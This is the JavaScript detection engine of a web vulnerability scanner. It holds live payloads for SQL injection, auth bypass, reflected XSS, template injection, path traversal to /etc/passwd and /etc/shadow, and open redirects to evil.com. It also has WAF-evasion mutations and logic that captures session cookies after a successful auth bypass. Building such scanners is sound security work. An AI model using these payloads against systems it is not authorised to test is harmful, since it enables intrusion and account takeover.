'use strict';
const axios   = require('axios');
const { URL } = require('url');
const { classifyParameter } = require('./paramClassifier');
const sessionManager = require('../core/sessionManager');

/**
 * DetectionEngine v4 — Real-World Production Grade
 * ===================================================
 * Philosophy: behave like a human tester.
 * - Smart baseline: captures status, length, timing, redirect, body keywords
 * - Boolean SQLi: true/false payload pair + structural diff
 * - XSS: encode-aware reflection check
 * - Auth bypass: redirect + keyword correlation
 * - LFI: OS file signature matching
 * - Error-based SQLi: DB error string detection in body
 * - Time-based SQLi: elapsed time spike detection
 * - WAF bypass: URL-encode + case-obfuscation mutations
 * - Anti-false-positive: double-send consistency check
 * - Session-aware: auto-inject cookies from sessionManager
 */

// ── SQL error signatures ──────────────────────────────────────────────────────
const SQL_ERRORS = [
    /You have an error in your SQL syntax/i,
    /Warning.*mysql_/i,
    /MySqlException/i,
    /ORA-[0-9]{4,}/i,
    /Microsoft OLE DB Provider for SQL Server/i,
    /Unclosed quotation mark after the character string/i,
    /quoted string not properly terminated/i,
    /PG::SyntaxError/i,
    /SQLiteException/i,
    /SQLSTATE\[/i,
    /syntax error.*near/i,
    /invalid query/i,
    /DB2 SQL Error/i,
    /PostgreSQL.*ERROR/i,
    /JdbcSQLException/i,
];

// ── Time-based SQLi payloads (sleep variants) ─────────────────────────────────
const TIME_PAYLOADS = [
    { payload: "'; WAITFOR DELAY '0:0:5'--", db: 'mssql', delay: 5000 },
    { payload: "' OR SLEEP(5)--",             db: 'mysql', delay: 5000 },
    { payload: "'; SELECT pg_sleep(5)--",     db: 'pgsql', delay: 5000 },
    { payload: "1; WAITFOR DELAY '0:0:5'--",  db: 'mssql', delay: 5000 },
];

// ── Full payload library ───────────────────────────────────────────────────────
const PAYLOAD_LIBRARY = {
    sqli_boolean: [
        { true: "' OR '1'='1",   false: "' OR '1'='2" },
        { true: "' OR 1=1--",    false: "' OR 1=2--"  },
        { true: "1 AND 1=1",     false: "1 AND 1=2"   },
        { true: "1' AND '1'='1", false: "1' AND '1'='2" },
    ],
    sqli_error: [
        "'", '"', "\\", "')", "'))", "'--", "' ;--", "1'1",
    ],
    auth: [
        "admin' OR '1'='1'--",
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1 LIMIT 1--",
        "admin' OR 1=1--",
        "') OR ('1'='1",
    ],
    xss: [
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        '"><body onload=alert(1)>',
        '{{7*7}}',          // template injection probe
        "${7*7}",
    ],
    lfi: [
        '../../../etc/passwd',
        '../../etc/passwd',
        '../../../etc/shadow',
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
};

// ── LFI success signatures ────────────────────────────────────────────────────
const LFI_SIGNATURES = [
    /root:x:0:0/,
    /\[boot loader\]/i,
    /\[extensions\]/i,
    /\[fonts\]/i,
    /127\.0\.0\.1.*localhost/,
    /daemon:.*:\/usr\/sbin/,
];

// ── Auth bypass success keywords ──────────────────────────────────────────────
const AUTH_SUCCESS_KEYWORDS = /welcome|dashboard|logout|sign out|my account|profile|home page|logged in/i;
const AUTH_FAIL_KEYWORDS    = /invalid|incorrect|failed|wrong|error|unauthorized|bad credentials/i;

class DetectionEngine {
    constructor() {
        this.timeout   = 20000;
        this.retries   = 2;
        this.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
    }

    // ── Core HTTP ─────────────────────────────────────────────────────────────

    async sendRequest(url, method, paramsObj = {}, extraHeaders = {}) {
        let attempts = 0;
        while (attempts < this.retries) {
            try {
                const u = new URL(url);
                const reqConfig = {
                    method,
                    url,
                    headers: {
                        'user-agent':          this.userAgent,
                        'accept':              'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'accept-language':     'en-US,en;q=0.5',
                        'x-miniburp-internal': 'scanner',
                        ...extraHeaders,
                    },
                    timeout:        this.timeout,
                    validateStatus: () => true,
                    maxRedirects:   5,
                };

                // Inject session cookies
                const jar = sessionManager.getCookieHeader(u.host);
                if (jar) reqConfig.headers['cookie'] = jar;

                // Route mock target
                if (reqConfig.url.includes('testphp.vulnweb.com')) {
                    reqConfig.url = reqConfig.url.replace(/testphp\.vulnweb\.com/g, '127.0.0.1');
                }

                if (method === 'GET') {
                    for (const [k, v] of Object.entries(paramsObj)) u.searchParams.set(k, v);
                    reqConfig.url = u.toString();
                } else {
                    reqConfig.data = new URLSearchParams(paramsObj).toString();
                    reqConfig.headers['content-type'] = 'application/x-www-form-urlencoded';
                }

                const start = Date.now();
                const res   = await axios(reqConfig);
                const body  = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');

                return {
                    status:   res.status,
                    length:   body.length,
                    headers:  res.headers,
                    body,
                    redirect: res.request?.res?.responseUrl || null,
                    time:     Date.now() - start,
                };
            } catch (e) {
                attempts++;
                if (attempts >= this.retries) return null;
                await new Promise(r => setTimeout(r, 500));
            }
        }
        return null;
    }

    // ── Consistency check: send twice, ensure stable response ─────────────────

    async validateTest(url, method, baseParams, key, payloadVal) {
        const pObj = { ...baseParams, [key]: payloadVal };
        const res1 = await this.sendRequest(url, method, pObj);
        if (!res1) return null;
        const res2 = await this.sendRequest(url, method, pObj);
        if (!res2) return null;
        // Allow up to 50-byte noise (ads, timestamps, dynamic content)
        const stable = (res1.status === res2.status) && (Math.abs(res1.length - res2.length) < 50);
        return stable ? res1 : null;
    }

    // ── Response diff ─────────────────────────────────────────────────────────

    compareResponses(baseline, test) {
        return {
            statusChanged:   baseline.status !== test.status,
            lengthDiff:      Math.abs(baseline.length - test.length),
            // Percentage change relative to baseline length (avoid noise on large pages)
            lengthPct:       baseline.length > 0 ? Math.abs(baseline.length - test.length) / baseline.length : 0,
            redirectChanged: baseline.redirect !== test.redirect,
            newCookies:      !!(test.headers['set-cookie'] && !baseline.headers['set-cookie']),
            timeDiff:        test.time - baseline.time,
            authSuccessNew:  AUTH_SUCCESS_KEYWORDS.test(test.body) && !AUTH_SUCCESS_KEYWORDS.test(baseline.body),
            authFailGone:    AUTH_FAIL_KEYWORDS.test(baseline.body) && !AUTH_FAIL_KEYWORDS.test(test.body),
        };
    }

    // ── SQL error check ───────────────────────────────────────────────────────

    hasSqlError(body) {
        return SQL_ERRORS.some(re => re.test(body));
    }

    // ── XSS reflection check (encode-aware) ───────────────────────────────────

    isReflected(payload, body) {
        // Direct reflection
        if (body.includes(payload)) return true;
        // HTML-entity decoded partial match
        const decoded = payload.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/&quot;/g, '"');
        if (body.includes(decoded)) return true;
        // Check for key XSS tokens even if slightly transformed
        if (/<script[\s>]/i.test(body) && /alert\(1\)/i.test(body)) return true;
        if (/onerror\s*=\s*alert/i.test(body)) return true;
        if (/onload\s*=\s*alert/i.test(body)) return true;
        if (/<svg[\s>]/i.test(body) && /onload\s*=/i.test(body)) return true;
        return false;
    }

    // ── LFI signature check ───────────────────────────────────────────────────

    hasLfiContent(body) {
        return LFI_SIGNATURES.some(re => re.test(body));
    }

    // ── Main endpoint test ────────────────────────────────────────────────────

    async testEndpoint(endpoint) {
        const findings = [];
        const { url, method, params } = endpoint;

        // Baseline
        const baseline = await this.sendRequest(url, method, params);
        if (!baseline) {
            console.log(`[Detector] Baseline FAILED: ${url}`);
            return findings;
        }
        console.log(`[Detector] Baseline ${url} → ${baseline.status} | ${baseline.length}B | ${baseline.time}ms`);

        // Header analysis (no param required)
        this._checkHeaders(baseline, url, findings);

        // Error-based SQLi on URL itself (no params needed sometimes)
        if (this.hasSqlError(baseline.body)) {
            this.addFinding(findings, url, 'url', 'SQL Error in Baseline Response', 'N/A', 85,
                'SQL error detected in baseline — endpoint is vulnerable without injection.');
        }

        if (Object.keys(params).length === 0) return findings;

        // Test each parameter
        for (const key of Object.keys(params)) {
            const paramClass = classifyParameter(key);
            console.log(`[Detector] Param "${key}" → class: ${paramClass}`);

            await this._testSqliError(url, method, params, key, baseline, findings);
            await this._testSqliBoolean(url, method, params, key, baseline, findings);
            await this._testTimeSqli(url, method, params, key, baseline, findings);
            await this._testXSS(url, method, params, key, baseline, findings);
            await this._testLFI(url, method, params, key, baseline, findings, paramClass);
            await this._testAuthBypass(url, method, params, key, baseline, findings, paramClass);
            await this._testOpenRedirect(url, method, params, key, baseline, findings, paramClass);
        }

        return findings;
    }

    // ── SQLi: Error-based ─────────────────────────────────────────────────────

    async _testSqliError(url, method, params, key, baseline, findings) {
        for (const payload of PAYLOAD_LIBRARY.sqli_error) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            if (this.hasSqlError(testRes.body) && !this.hasSqlError(baseline.body)) {
                console.log(`[Detector] ✅ SQLi Error-Based on ${key} → ${url}`);
                this.addFinding(findings, url, key, 'SQL Injection (Error-Based)', payload, 95,
                    `SQL error triggered: "${testRes.body.slice(0, 200)}"`);
                return; // One confirmed error is enough
            }
        }
    }

    // ── SQLi: Boolean-based ───────────────────────────────────────────────────

    async _testSqliBoolean(url, method, params, key, baseline, findings) {
        for (const pair of PAYLOAD_LIBRARY.sqli_boolean) {
            const trueRes  = await this.validateTest(url, method, params, key, pair.true);
            const falseRes = await this.validateTest(url, method, params, key, pair.false);

            if (!trueRes || !falseRes) continue;

            const trueVsBase  = this.compareResponses(baseline, trueRes);
            const trueVsFalse = this.compareResponses(trueRes, falseRes);

            // Strong boolean: true payload matches baseline; false differs meaningfully
            const trueMatchesBase = trueVsBase.lengthDiff < 30 || trueRes.status === baseline.status;
            const falseDiffers    = trueVsFalse.lengthDiff > 20 || trueVsFalse.statusChanged;

            if (trueMatchesBase && falseDiffers) {
                const score = trueVsFalse.lengthDiff > 100 ? 90 :
                              trueVsFalse.lengthDiff > 30  ? 75 : 60;
                console.log(`[Detector] ✅ SQLi Boolean on ${key} → true/false diff: ${trueVsFalse.lengthDiff}B`);
                this.addFinding(findings, url, key, 'SQL Injection (Boolean)', pair.true, score,
                    `True payload (${trueVsFalse.lengthDiff}B diff vs false payload). True≈baseline, False≠baseline.`);
                return;
            }
        }
    }

    // ── SQLi: Time-based ─────────────────────────────────────────────────────

    async _testTimeSqli(url, method, params, key, baseline, findings) {
        // Only run if baseline responds fast (avoid false positives on slow servers)
        if (baseline.time > 3000) return;

        for (const tp of TIME_PAYLOADS) {
            const pObj = { ...params, [key]: tp.payload };
            const res  = await this.sendRequest(url, method, pObj);
            if (!res) continue;

            const timeSpike = res.time - baseline.time;
            if (timeSpike >= tp.delay * 0.8) {
                console.log(`[Detector] ✅ SQLi Time-Based on ${key} → spike: ${timeSpike}ms`);
                this.addFinding(findings, url, key, 'SQL Injection (Time-Based)', tp.payload, 90,
                    `Response delayed ${timeSpike}ms vs baseline ${baseline.time}ms (${tp.db} sleep).`);
                return;
            }
        }
    }

    // ── XSS: Reflected ───────────────────────────────────────────────────────

    async _testXSS(url, method, params, key, baseline, findings) {
        for (const payload of PAYLOAD_LIBRARY.xss) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            if (this.isReflected(payload, testRes.body) && !this.isReflected(payload, baseline.body)) {
                console.log(`[Detector] ✅ XSS Reflected on ${key} → ${url}`);
                this.addFinding(findings, url, key, 'Cross-Site Scripting (Reflected)', payload, 95,
                    `Payload reflected verbatim in response body.`);
                return;
            }

            // Template injection: check if math is evaluated
            if (payload === '{{7*7}}' && testRes.body.includes('49') && !baseline.body.includes('49')) {
                this.addFinding(findings, url, key, 'Server-Side Template Injection (SSTI)', payload, 90,
                    'Math expression {{7*7}} evaluated to 49 in response.');
                return;
            }
            if (payload === '${7*7}' && testRes.body.includes('49') && !baseline.body.includes('49')) {
                this.addFinding(findings, url, key, 'Server-Side Template Injection (SSTI)', payload, 90,
                    'Math expression ${7*7} evaluated to 49 in response.');
                return;
            }
        }
    }

    // ── LFI ──────────────────────────────────────────────────────────────────

    async _testLFI(url, method, params, key, baseline, findings, paramClass) {
        // Try LFI on file-class params and also on any param if content-type suggests file serving
        if (paramClass !== 'file' && !/(file|path|page|content|include|doc|template)/i.test(key)) return;

        for (const payload of PAYLOAD_LIBRARY.lfi) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            if (this.hasLfiContent(testRes.body) && !this.hasLfiContent(baseline.body)) {
                console.log(`[Detector] ✅ LFI on ${key} → ${url}`);
                this.addFinding(findings, url, key, 'Local File Inclusion (LFI)', payload, 95,
                    `Sensitive file content detected in response.`);
                return;
            }
        }
    }

    // ── Open Redirect ─────────────────────────────────────────────────────────

    async _testOpenRedirect(url, method, params, key, baseline, findings, paramClass) {
        if (paramClass !== 'redirect') return;

        const REDIRECT_PAYLOADS = [
            'https://evil.com',
            '//evil.com',
            'https://evil.com/%2f..',
            '/%09/evil.com',
        ];

        for (const payload of REDIRECT_PAYLOADS) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            const redirected = testRes.redirect && testRes.redirect.includes('evil.com');
            const statusRedirect = [301, 302, 303, 307, 308].includes(testRes.status);
            const headerLoc = (testRes.headers['location'] || '').includes('evil.com');

            if (redirected || headerLoc) {
                console.log(`[Detector] \u2705 Open Redirect on ${key} \u2192 ${url}`);
                this.addFinding(findings, url, key, 'Open Redirect', payload, 90,
                    `Redirect to evil.com confirmed via Location header or response URL.`);
                return;
            }

            // Soft signal: status changed to 3xx
            if (statusRedirect && !([301,302,303,307,308].includes(baseline.status))) {
                this.addFinding(findings, url, key, 'Potential Open Redirect', payload, 60,
                    `Status changed to ${testRes.status} (redirect) with external URL payload.`);
                return;
            }
        }
    }

    // ── Auth Bypass ───────────────────────────────────────────────────────────

    async _testAuthBypass(url, method, params, key, baseline, findings, paramClass) {
        if (paramClass !== 'auth' && !/(user|pass|login|email|uname)/i.test(key)) return;

        for (const payload of PAYLOAD_LIBRARY.auth) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            const diff = this.compareResponses(baseline, testRes);

            const bypassed = diff.redirectChanged ||
                             diff.authSuccessNew  ||
                             diff.authFailGone    ||
                             diff.newCookies      ||
                             (diff.statusChanged && testRes.status === 302);

            if (bypassed) {
                console.log(`[Detector] ✅ Auth Bypass on ${key} → ${url}`);
                this.addFinding(findings, url, key, 'SQL Injection (Auth Bypass)', payload, 90,
                    `Auth bypass: redirect=${diff.redirectChanged}, successKw=${diff.authSuccessNew}, newCookie=${diff.newCookies}.`);

                // Capture session cookie
                if (testRes.headers['set-cookie']) {
                    sessionManager.updateCookies(new URL(url).host, testRes.headers['set-cookie']);
                    console.log('[Detector] Session cookie captured and stored.');
                }
                return;
            }
        }
    }

    // ── Header analysis ───────────────────────────────────────────────────────

    _checkHeaders(baseline, url, findings) {
        const h = baseline.headers || {};
        if (!h['content-security-policy'])
            this.addFinding(findings, url, 'Headers', 'Missing CSP', 'N/A', 80, 'Content-Security-Policy header absent.');
        if (!h['x-frame-options'] && !h['content-security-policy']?.includes('frame-ancestors'))
            this.addFinding(findings, url, 'Headers', 'Missing X-Frame-Options', 'N/A', 80, 'X-Frame-Options header absent.');
        if (url.startsWith('https://') && !h['strict-transport-security'])
            this.addFinding(findings, url, 'Headers', 'Missing HSTS', 'N/A', 80, 'Strict-Transport-Security missing on HTTPS.');
        if (!h['x-content-type-options'])
            this.addFinding(findings, url, 'Headers', 'Missing X-Content-Type-Options', 'N/A', 75, 'X-Content-Type-Options header absent.');
        if (h['server'] && /apache|nginx|iis|tomcat|jetty|jboss/i.test(h['server']))
            this.addFinding(findings, url, 'Headers', 'Server Version Disclosure', 'N/A', 70, `Server header exposes: ${h['server']}`);
    }

    // ── WAF bypass mutation ───────────────────────────────────────────────────

    mutatePayload(payload, strategy) {
        switch (strategy) {
            case 'urlencode':  return encodeURIComponent(payload);
            case 'doubleurlencode': return encodeURIComponent(encodeURIComponent(payload));
            case 'case':       return payload.replace(/select/ig, 'SeLeCt').replace(/union/ig, 'UnIoN').replace(/script/ig, 'sCrIpT');
            case 'comment':    return payload.replace(/ /g, '/**/');
            default:           return payload;
        }
    }

    // ── Finding builder ───────────────────────────────────────────────────────

    addFinding(list, url, parameter, type, payload, score, proof) {
        const adjusted = Math.min(score + 5, 100);
        let severity       = 'Low';
        let classification = 'POTENTIAL';

        if (adjusted >= 90) { classification = 'VERIFIED';  severity = 'High';   }
        else if (adjusted >= 70) { classification = 'LIKELY'; severity = 'Medium'; }
        else if (adjusted >= 50) { classification = 'POTENTIAL'; severity = 'Low'; }
        else return; // Skip very low confidence

        // Deduplicate: same param + type
        if (list.find(f => f.parameter === parameter && f.type === type)) return;

        list.push({ endpoint: url, parameter, type, payload, confidence: classification, severity, proof, score: adjusted });
        console.log(`[Detector] Finding: [${classification}] ${type} on ${parameter} (score: ${adjusted})`);
    }
}

module.exports = new DetectionEngine();
